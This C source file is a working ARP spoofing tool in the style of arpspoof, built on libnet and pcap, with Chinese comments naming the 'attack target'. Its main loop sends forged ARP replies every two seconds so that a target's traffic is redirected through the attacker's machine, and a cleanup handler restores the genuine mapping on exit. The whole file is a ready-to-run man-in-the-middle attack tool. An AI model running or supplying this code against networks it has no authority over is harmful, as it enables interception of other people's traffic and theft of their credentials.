#include <unistd.h>
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>
#include <stdlib.h>
#include <libnet.h>
#include <pcap.h>
#include "arp.h"

char err_buf[LIBNET_ERRBUF_SIZE];

#define ErrPrintQ(_msg, _errstr) do{fprintf(stderr, "Error in func %s() [%s]: %s\n", __func__, _msg, _errstr); exit(EXIT_FAILURE);}while(0)

in_addr_t target_ip = 0;	//攻击目标IP（网络字节）
in_addr_t spoof_ip = 0;		//伪装IP(网络字节)
char *interface = NULL;	//网络设备名称
u_int8_t target_mac[6] = "";	//攻击目标mac


void usage(void)
{
	fprintf(stderr, "\n"
		"Usage: arpspoof [-i interface] [-t target] host\n");
	exit(EXIT_FAILURE);
}

void cleanup(int sig)
{
	int i;
	u_int8_t spoof_mac[6];

	if (arp_find(interface, spoof_ip, spoof_mac) != -1) {
		for (i = 0; i < 3; i++) {
			/* XXX - on BSD, requires ETHERSPOOF kernel. */
			arp_send(interface, ARPOP_REPLY,
				 (u_char *)&spoof_mac, spoof_ip,
				 (target_ip ? (u_char *)&target_mac : NULL),
				 target_ip);
			sleep(1);
		}
	}
	exit(0);
}

int main(int argc, char *argv[])
{
	int c;

	while ((c = getopt(argc, argv, "i:t:?h")) != -1) {
		switch (c) {
		case 'i':
			interface = optarg;
			break;
		case 't':
			if ((target_ip = libnet_name2addr4(NULL, optarg, LIBNET_DONT_RESOLVE)) == -1)
				usage();
			printf("Target IP: %s\n", inet_ntoa(*(struct in_addr*)&target_ip));
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;

	if (argc != 1)
		usage();

	if ((spoof_ip = libnet_name2addr4(NULL, argv[0], LIBNET_DONT_RESOLVE)) == -1)
		usage();
	printf("Spoof IP: %s\n", inet_ntoa(*(struct in_addr*)&spoof_ip));

	if (spoof_ip == 0)
		usage();

	if (interface == NULL)
		if ((interface = pcap_lookupdev(err_buf)) == NULL)
			ErrPrintQ("pcap_lookupdev", err_buf);

	if (target_ip != 0 && arp_find(interface, target_ip, target_mac) == -1)
		ErrPrintQ("arp_find", "");
	printf("Get target_mac: %x:%x:%x:%x:%x:%x\n", (unsigned char)target_mac[0], (unsigned char)target_mac[1],(unsigned char)target_mac[2],(unsigned char)target_mac[3],(unsigned char)target_mac[4],(unsigned char)target_mac[5]);

	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);

	while (1) {
		arp_send(interface, ARPOP_REPLY, NULL, spoof_ip, target_ip?target_mac:NULL, target_ip);
		sleep(2);
	}

	return 0;
}
